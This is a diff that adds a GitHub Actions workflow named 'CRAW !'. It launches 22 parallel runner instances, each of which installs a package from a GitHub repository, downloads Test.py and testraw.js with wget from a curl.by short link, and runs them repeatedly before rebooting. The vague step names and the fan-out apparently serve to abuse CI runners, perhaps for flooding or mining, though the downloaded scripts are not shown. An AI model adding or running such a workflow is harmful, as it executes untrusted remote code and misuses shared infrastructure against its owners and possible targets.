@@ -1,0 +1,37 @@
+name: CRAW !
+
+on:
+  workflow_dispatch:
+
+jobs:
+  vds:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 22
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22]
+
+
+    steps:
+      - name: OK !
+        run: |
+          pip install git+https://github.com/QuantumLLC/Archer
+          wget https://curl.by/XkdGB/Test.py
+          wget https://curl.by/XkdGB/testraw.js
+          chmod +x testraw.js
+          chmod +x Test.py
+          PIDS=()
+          for i in {1..4}; do
+            timeout 105 python3 Test.py 1 && node testraw.js 1 666
+            PIDS+=($!)
+          done
+          
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
+
+      - name: OK !
+        run: sleep 105
+        
+      - name: OK !
+        run: sudo reboot
